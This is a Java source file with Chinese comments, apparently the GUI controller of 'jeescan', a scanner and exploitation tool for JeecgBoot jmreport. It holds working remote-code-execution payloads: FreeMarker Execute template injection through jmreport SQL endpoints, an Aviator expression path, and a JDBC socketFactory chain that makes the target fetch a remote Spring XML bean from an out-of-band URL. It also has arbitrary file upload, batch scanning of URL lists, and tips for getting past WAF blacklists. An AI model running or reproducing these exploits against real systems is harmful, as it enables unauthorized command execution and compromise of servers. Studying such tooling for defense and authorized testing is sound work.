package com.jeescan.ui;

import com.jeescan.Cli;
import com.jeescan.core.Detector;
import com.jeescan.core.Engine;
import com.jeescan.core.Http;
import com.jeescan.core.Result;

import javafx.application.Platform;
import javafx.concurrent.Task;
import javafx.stage.FileChooser;

import java.io.File;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * 界面逻辑控制器。
 * 把扫描/命令/上传/批量的执行从 MainView 拆出来，避免视图类过长。
 */
public class Controller {

    private final MainView v;

    public Controller(MainView v) { this.v = v; }

    /**
     * 统一构造 Http 实例，并把代理配置应用上去。
     * 所有发请求的地方都必须走这里，否则代理不生效。
     */
    private Http newHttp(String base, String token) {
        Http h = new Http(base, token);   // 真正的构造，不能写成 newHttp（会无限递归）
        if (v.proxyOn()) {
            int port = MainView.toInt(v.proxyPortText(), 0);
            h.setProxy(v.proxyTypeText(), v.proxyHostText(), port,
                    v.proxyUserText(), v.proxyPassText());
        }
        return h;
    }

    /** 测试代理连通性。 */
    public void testProxy() {
        if (!v.proxyOn()) {
            v.log("[!] 未勾选「使用代理」");
            return;
        }
        int port = MainView.toInt(v.proxyPortText(), 0);
        if (v.proxyHostText().isEmpty() || port <= 0) {
            v.log("[!] 请填代理主机和端口");
            return;
        }
        Http h = newHttp("http://127.0.0.1", null);
        String err = h.testProxy(3000);
        if (err == null) {
            v.log("[+] 代理可用：" + h.getProxyDesc());
        } else {
            v.log("[-] 代理不可用（" + h.getProxyDesc() + "）：" + err);
        }
    }

    // ============================================================ 扫描

    public void scan() {
        String base = v.target();
        if (base.isEmpty()) { v.log("[!] 请填写目标根地址"); return; }

        List<Detector> list = new ArrayList<>();
        for (MainView.Row r : v.rows()) if (r.checked.get()) list.add(r.detector);
        if (list.isEmpty()) { v.log("[!] 没有勾选任何检测项"); return; }

        if (!v.sensitiveOn()) {
            List<Detector> f = new ArrayList<>();
            for (Detector d : list) {
                if ("24".equals(d.getId()) || "25".equals(d.getId())) continue;
                f.add(d);
            }
            if (f.size() != list.size()) {
                v.log("[*] 未勾选「敏感操作」，跳过 #24 默认口令 / #25 密码重置");
            }
            list = f;
        }

        Http http = newHttp(base, v.token());
        http.setSleep(v.sleepSec() * 1000);
        http.setTimeout(v.timeoutSec() * 1000);
        final Detector.Ctx ctx = new Detector.Ctx(http, v.prefix(), v.token(),
                v.echoOn(), v.oob(), "id", v.sensitiveOn());

        final List<Detector> fl = list;
        for (MainView.Row r : v.rows()) {
            r.result = null;
            r.resultText.set("");
        }
        v.echoArea().clear();
        v.logArea().clear();

        v.log("目标: " + base + "    接口: "
                + (v.prefix().isEmpty() ? "(根)" : v.prefix())
                + "    检测项: " + fl.size());
        v.log("");

        v.progress().setProgress(0);
        v.scanBtn().setDisable(true);
        v.stopBtn().setDisable(false);
        v.statLabel().setText("扫描中...");

        final Engine eng = new Engine();
        v.setEngine(eng);

        Task<List<Result>> task = new Task<List<Result>>() {
            @Override protected List<Result> call() {
                return eng.run(fl, ctx, new Engine.Listener() {
                    public void onStart(Detector d, int i, int total) {
                        // 简洁模式不打开始行
                    }
                    public void onDone(Result r, int i, int total) {
                        final String line = Cli.line(r);
                        final String dump = v.echoOn() ? r.dump() : null;
                        Platform.runLater(() -> {
                            v.log(line);
                            if (dump != null) v.log(dump);
                            v.progress().setProgress((double) i / fl.size());
                        });
                    }
                    public void onLog(String l) {
                        Platform.runLater(() -> v.log(l));
                    }
                    public void onFinish(List<Result> rs) {}
                });
            }

            @Override protected void succeeded() {
                List<Result> rs = getValue();
                int vuln = 0, maybe = 0, safe = 0, err = 0;
                for (Result r : rs) {
                    switch (r.state) {
                        case VULN: vuln++; break;
                        case MAYBE: maybe++; break;
                        case SAFE: safe++; break;
                        case ERROR: err++; break;
                        default: break;
                    }
                }
                for (MainView.Row row : v.rows()) {
                    for (Result r : rs) {
                        if (r.id.equals(row.id)) {
                            row.result = r;
                            row.resultText.set(r.state.label
                                    + (r.verdict.isEmpty() ? "" : "  " + r.verdict));
                            break;
                        }
                    }
                }
                v.table().refresh();
                v.progress().setProgress(1);
                v.statLabel().setText("存在 " + vuln + "   待确认 " + maybe
                        + "   共 " + rs.size());

                v.log("");
                v.log("----------------------------------------");
                v.log("存在 " + vuln + "    待确认 " + maybe + "    共 " + rs.size() + " 项");
                if (vuln > 0) {
                    v.log("");
                    for (Result r : rs) {
                        if (r.isVuln()) {
                            v.log("[+] " + r.name + "  (" + r.severity + ")");
                        }
                    }
                }
                if (maybe > 0) {
                    v.log("");
                    for (Result r : rs) {
                        if (r.isMaybe()) {
                            v.log("[?] " + r.name);
                        }
                    }
                }
                if (vuln == 0 && maybe == 0) {
                    v.log("");
                    v.log("未发现漏洞。勾选「完整回显」可查看每条 payload 自行核对。");
                }
            }

            @Override protected void failed() {
                v.log("[!] 异常: " + getException());
            }

            @Override protected void done() {
                v.scanBtn().setDisable(false);
                v.stopBtn().setDisable(true);
            }
        };
        Thread t = new Thread(task, "jeescan-worker");
        t.setDaemon(true);
        t.start();
    }

    // ============================================================ CmdShell

    public void execCmd() {
        String base = v.target();
        String cmd = v.cmdText();
        if (base.isEmpty() || cmd.isEmpty()) {
            v.cmdOut().setText("[!] 请先填目标地址和命令\n");
            return;
        }

        Http h = newHttp(base, v.token());
        h.setTimeout(v.timeoutSec() * 1000);
        final Detector.Ctx ctx = new Detector.Ctx(h, v.prefix(), v.token(), true,
                v.oob(), cmd, true);
        final int idx = v.cmdPointIndex();

        v.cmdOut().setText("[*] 执行中...\n");
        v.cmdSendBtnDisable(true);

        Task<String> task = new Task<String>() {
            @Override protected String call() { return doExec(ctx, idx, cmd); }
            @Override protected void succeeded() { v.cmdOut().setText(getValue()); }
            @Override protected void failed()   { v.cmdOut().setText("[!] " + getException()); }
            @Override protected void done()      { v.cmdSendBtnDisable(false); }
        };
        Thread t = new Thread(task, "jeescan-cmd");
        t.setDaemon(true);
        t.start();
    }

    private String doExec(Detector.Ctx ctx, int idx, String cmd) {
        Http h = ctx.http;
        StringBuilder sb = new StringBuilder();

        // FreeMarker 系列：同步回显
        if (idx >= 0 && idx <= 2) {
            String path;
            String body;
            if (idx == 0) {
                path = ctx.p("jmreport/queryFieldBySql");
                body = "{\"sql\":\"select '<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()>${ex(\\\""
                        + cmd + "\\\")}'\"}";
            } else if (idx == 1) {
                path = ctx.p("jmreport/loadTableData");
                body = "{\"dbSource\":\"\",\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\""
                        + cmd + "\\\")}'\",\"tableName\":\"test_demo\",\"pageNo\":1,\"pageSize\":10}";
            } else {
                path = ctx.p("jmreport/qurestSql");
                body = "{\"apiSelectId\":\"1\",\"id\":\"select '<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()>${ex(\\\""
                        + cmd + "\\\")}'\"}";
            }
            Http.Resp r = h.postJson(path, body);
            sb.append("POST ").append(h.url(path)).append("\n");
            sb.append("Body: ").append(body).append("\n\n");
            if (r.rst) sb.append("[RST] ").append(r.err);
            else sb.append("HTTP ").append(r.status).append("  ")
                    .append(r.costMs).append("ms\n\n").append(r.text);
            sb.append("\n\n提示: 若上方包含命令输出即成功；若返回 xss 检测/黑名单，需人工变形。");
            return sb.toString();
        }

        // Aviator
        if (idx == 3) {
            String cid = "99" + String.format("%017d",
                    System.currentTimeMillis() % 100000000000000000L);
            String body = "{\"loopBlockList\":[],\"area\":false,\"printElWidth\":718,"
                    + "\"excel_config_id\":\"" + cid + "\",\"printElHeight\":1047,"
                    + "\"rows\":{\"4\":{\"cells\":{\"4\":{\"text\":\"=6*7\",\"style\":0}},"
                    + "\"height\":25},\"len\":96},"
                    + "\"dbexps\":[],\"dicts\":[],\"freeze\":\"A1\",\"name\":\"sheet1\","
                    + "\"styles\":[{\"align\":\"center\"}],\"validations\":[],"
                    + "\"cols\":{\"4\":{\"width\":95},\"len\":50},\"merges\":[\"E4:F4\"]}";
            String savePath = ctx.p("jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123");
            Http.Resp s = h.postJson(savePath, body);
            sb.append("POST ").append(h.url(savePath)).append("\n");
            sb.append("Save: ").append(s.rst ? "[RST]" : ("HTTP " + s.status)).append("\n\n");

            Map<String, String> q = new LinkedHashMap<>();
            q.put("id", cid);
            Http.Resp sh = h.get(ctx.p("jmreport/show"), q);
            sb.append("GET ").append(h.url(ctx.p("jmreport/show")))
              .append("?id=").append(cid).append("\n\n");
            sb.append(sh.rst ? "[RST] " + sh.err : sh.text);
            sb.append("\n\n提示: Aviator 在本类目标上通常禁实例方法，exec 可能不可用。");
            return sb.toString();
        }

        // testConnection socketFactory
        String oob = ctx.oobUrl.isEmpty() ? "http://127.0.0.1:1/bean.xml" : ctx.oobUrl;
        String sfBody = "{\"dbDriver\":\"org.postgresql.Driver\",\"dbUrl\":"
                + "\"jdbc:postgresql://127.0.0.1:5432/x?socketFactory="
                + "org.springframework.context.support.FileSystemXmlApplicationContext"
                + "&socketFactoryArg=" + oob + "\","
                + "\"dbUsername\":\"postgres\",\"dbPassword\":\"postgres\"}";
        Http.Resp r = h.postJson(ctx.p("jmreport/testConnection"), sfBody);
        sb.append("POST ").append(h.url(ctx.p("jmreport/testConnection"))).append("\n\n");
        sb.append(r.rst ? "[RST] " + r.err : ("HTTP " + r.status + "\n" + r.text));
        sb.append("\n\n重要: could not be instantiated 属正常，命令已在强转前执行完毕。");
        sb.append("\n      请到 ").append(oob).append(" 查看回连。");
        return sb.toString();
    }

    // ============================================================ 上传

    public void upload() {
        String base = v.target();
        String path = v.upPathText();
        String name = v.upNameText();
        String field = v.upFieldText();
        String content = v.upContentText();
        if (base.isEmpty() || path.isEmpty()) {
            v.upOut().setText("[!] 请填目标地址与上传接口\n");
            return;
        }

        Http h = newHttp(base, v.token());
        String boundary = "----WebKitFormBoundary" + Long.toHexString(System.nanoTime());
        StringBuilder sb = new StringBuilder();
        sb.append("--").append(boundary).append("\r\n");
        sb.append("Content-Disposition: form-data; name=\"").append(field)
          .append("\"; filename=\"").append(name).append("\"\r\n");
        sb.append("Content-Type: application/octet-stream\r\n\r\n");
        sb.append(content).append("\r\n");
        sb.append("--").append(boundary).append("\r\n");
        sb.append("Content-Disposition: form-data; name=\"fileName\"\r\n\r\n");
        sb.append(name).append("\r\n");
        sb.append("--").append(boundary).append("\r\n");
        sb.append("Content-Disposition: form-data; name=\"biz\"\r\n\r\n");
        sb.append("excel_online\r\n");
        sb.append("--").append(boundary).append("--\r\n");

        String full = (v.prefix().isEmpty() ? "" : v.prefix() + "/") + path;
        Http.Resp r = h.postRaw(full, sb.toString().getBytes(
                java.nio.charset.Charset.forName("UTF-8")),
                "multipart/form-data; boundary=" + boundary);

        StringBuilder out = new StringBuilder();
        out.append("POST ").append(h.url(full)).append("\n");
        out.append("文件名: ").append(name).append("   字段: ").append(field).append("\n\n");
        out.append(r.rst ? "[RST] " + r.err : ("HTTP " + r.status + "\n" + r.text));
        v.upOut().setText(out.toString());
    }

    // ============================================================ 批量

    public void batch() {
        String file = v.batchFileText();
        if (file.isEmpty()) { v.batchOut().setText("[!] 请先选择 urls.txt\n"); return; }

        List<String> urls = new ArrayList<>();
        try {
            for (String line : java.nio.file.Files.readAllLines(
                    new File(file).toPath(), java.nio.charset.Charset.forName("UTF-8"))) {
                String s = line.trim();
                if (!s.isEmpty() && !s.startsWith("#")) urls.add(s);
            }
        } catch (Exception e) {
            v.batchOut().setText("[!] 读取失败: " + e + "\n");
            return;
        }
        if (urls.isEmpty()) { v.batchOut().setText("[!] 文件里没有有效 URL\n"); return; }

        List<Detector> dets = new ArrayList<>();
        for (MainView.Row r : v.rows()) if (r.checked.get()) dets.add(r.detector);
        if (dets.isEmpty()) {
            v.batchOut().setText("[!] 请先在「漏洞检测」勾选要跑的项目\n");
            return;
        }

        final String prefix = v.prefix();
        final String token = v.token();
        final int sleepSec = v.sleepSec();
        final int timeoutSec = v.timeoutSec();

        v.batchOut().setText("[*] 批量开始，共 " + urls.size() + " 个目标\n\n");

        Task<Void> task = new Task<Void>() {
            @Override protected Void call() {
                int hit = 0;
                for (int i = 0; i < urls.size(); i++) {
                    final String u = urls.get(i);
                    final int idx = i + 1;
                    Platform.runLater(() -> v.batchOut().appendText(
                            String.format("[%d/%d] %s\n", idx, urls.size(), u)));

                    Http http = newHttp(u, token);
                    http.setSleep(sleepSec * 1000);
                    http.setTimeout(timeoutSec * 1000);
                    Detector.Ctx ctx = new Detector.Ctx(http, prefix, token, false,
                            "", "id", false);
                    try {
                        Engine eng = new Engine();
                        List<Result> rs = eng.run(dets, ctx, new Engine.Listener() {
                            public void onStart(Detector d, int a, int b) {}
                            public void onDone(Result r, int a, int b) {}
                            public void onLog(String l) {}
                            public void onFinish(List<Result> r) {}
                        });
                        boolean any = false;
                        for (Result r : rs) {
                            if (r.isVuln()) {
                                any = true;
                                final String line = "      [+] #" + r.id + " " + r.name
                                        + "  " + r.verdict;
                                Platform.runLater(() -> v.batchOut().appendText(line + "\n"));
                            }
                        }
                        if (any) hit++;
                        else Platform.runLater(() -> v.batchOut().appendText("      无漏洞\n"));
                    } catch (Exception e) {
                        final String line = "      异常: " + e.getMessage();
                        Platform.runLater(() -> v.batchOut().appendText(line + "\n"));
                    }
                }
                final int h = hit;
                Platform.runLater(() -> v.batchOut().appendText(
                        "\n批量完成，存在漏洞的目标: " + h + " / " + urls.size() + "\n"));
                return null;
            }
        };
        Thread t = new Thread(task, "jeescan-batch");
        t.setDaemon(true);
        t.start();
    }

    // ============================================================ JDBC 利用

    /**
     * JDBC 利用（交互参考 jeecgBootAttack）：
     *   用户选驱动 + 填完整 jdbc uri，直接发到 /jmreport/testConnection。
     *
     * 「用网上全字段 POC」勾选时，请求体带上 id/code/dbType/dbName/userName，
     * 与网上公开 POC 结构一致；不勾时只发最小的 dbDriver/dbUrl/dbUsername/dbPassword。
     */
    public void jdbc() {
        String base = v.target();
        String driver = v.jdbcDriver();
        String uri = v.jdbcUriText();
        if (base.isEmpty()) {
            v.jdbcOut().setText("[!] 请先在顶部填目标根地址\n");
            return;
        }
        if (uri.isEmpty()) {
            v.jdbcOut().setText("[!] 请填 jdbc uri（可点「填模板」生成示例）\n");
            return;
        }

        String path = (v.prefix().isEmpty() ? "" : v.prefix() + "/") + "jmreport/testConnection";
        String body;
        if (v.jdbcWebPocOn()) {
            body = "{"
                    + "\"id\":\"1\","
                    + "\"code\":\"ABC\","
                    + "\"dbType\":\"MySQL\","
                    + "\"dbName\":\"383BAb7deFC825E6\","
                    + "\"dbDriver\":" + q(driver) + ","
                    + "\"dbUrl\":" + q(uri) + ","
                    + "\"dbPassword\":" + q(v.jdbcPassText()) + ","
                    + "\"userName\":" + q(v.jdbcUserText())
                    + "}";
        } else {
            body = "{"
                    + "\"dbDriver\":" + q(driver) + ","
                    + "\"dbUrl\":" + q(uri) + ","
                    + "\"dbUsername\":" + q(v.jdbcUserText()) + ","
                    + "\"dbPassword\":" + q(v.jdbcPassText())
                    + "}";
        }

        Http h = newHttp(base, v.token());
        h.setTimeout(v.timeoutSec() * 1000);

        v.jdbcOut().setText("[*] 发送中...\n\n");
        v.jdbcExecEnable(false);

        final String fpath = path;
        final String fbody = body;
        final String furi = uri;

        Task<String> task = new Task<String>() {
            @Override protected String call() {
                Http.Resp r = h.postJson(fpath, fbody);
                StringBuilder sb = new StringBuilder();
                sb.append("POST ").append(h.url(fpath)).append("\n\n");
                sb.append("请求体:\n").append(fbody).append("\n\n");
                if (r.rst) {
                    sb.append("[RST] ").append(r.err).append("\n");
                    sb.append("\n提示: 被重置多为 WAF 拦截（如 jdbc:mysql 是黑名单词），需变形。\n");
                    return sb.toString();
                }
                sb.append("HTTP ").append(r.status).append("  ")
                  .append(r.costMs).append("ms\n\n");
                sb.append(r.text).append("\n\n");
                sb.append("--------------------------------------------------\n");
                sb.append("判读:\n");
                if (r.text.contains("could not be instantiated")) {
                    sb.append("  [+] socketFactory 反射已执行 —— 属正常形态\n");
                    sb.append("      命令在强转失败【之前】就执行完了\n");
                    sb.append("      请到以下地址看是否有回连，有回连即为 RCE 成功:\n");
                    String arg = extractParam(furi, "socketFactoryArg");
                    sb.append("      ").append(arg == null ? "(uri 里没有 socketFactoryArg)" : arg);
                    sb.append("\n");
                } else if (r.text.contains("refused") || r.text.contains("Connection to")) {
                    sb.append("  [-] 驱动已加载并真实建连，但目标端口关闭\n");
                    sb.append("      说明驱动可用，可继续试 socketFactory 链\n");
                } else if (r.text.contains("驱动类不存在")) {
                    sb.append("  [-] 驱动不在 classpath，此链不通\n");
                } else if (r.text.contains("数据库连接成功")) {
                    sb.append("  [+] 数据库真的连上了\n");
                } else {
                    sb.append("  [?] 见上方响应原文\n");
                }
                return sb.toString();
            }

            @Override protected void succeeded() { v.jdbcOut().setText(getValue()); }
            @Override protected void failed()    { v.jdbcOut().setText("[!] " + getException()); }
            @Override protected void done()      { v.jdbcExecEnable(true); }
        };
        Thread t = new Thread(task, "jeescan-jdbc");
        t.setDaemon(true);
        t.start();
    }

    /** 从 uri 里取某个 query 参数值。 */
    private static String extractParam(String uri, String key) {
        if (uri == null) return null;
        int i = uri.indexOf(key + "=");
        if (i < 0) return null;
        int st = i + key.length() + 1;
        int en = uri.indexOf('&', st);
        if (en < 0) en = uri.length();
        return uri.substring(st, en);
    }

    private static String q(String s) {
        if (s == null) return "\"\"";
        return "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"") + "\"";
    }
}
